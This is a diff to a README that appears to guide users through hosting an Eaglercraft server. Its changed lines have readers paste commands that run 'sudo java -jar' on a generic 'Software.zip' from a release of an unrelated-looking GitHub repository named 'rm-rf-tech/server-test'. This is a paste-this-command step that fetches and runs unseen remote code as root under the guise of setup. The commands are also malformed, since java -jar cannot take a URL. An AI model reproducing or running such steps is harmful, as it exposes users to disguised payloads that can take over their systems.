@@ -17,10 +17,10 @@ now you have your own free server instance to host eaglercraft. Next you need to
 create 2 terminal tabs and paste in the following snipits:
 <br>
 <br>
-first tab: `cd server && sudo java -jar https://github.com/rm-rf-tech/server-test/releases/download/v1.0/Application.zip`
+first tab: `cd server && sudo java -jar https://github.com/rm-rf-tech/server-test/releases/download/v2.0/Software.zip`
 <br>
 <br>
-second tab: `cd bungee && sudo java -jar https://github.com/rm-rf-tech/server-test/releases/download/v1.0/Application.zip`
+second tab: `cd bungee && sudo java -jar https://github.com/rm-rf-tech/server-test/releases/download/v2.0/Software.zip`
 <br>
 <br>
 Now go to the ports area and forward (and make public) ports `25565` and `8081`
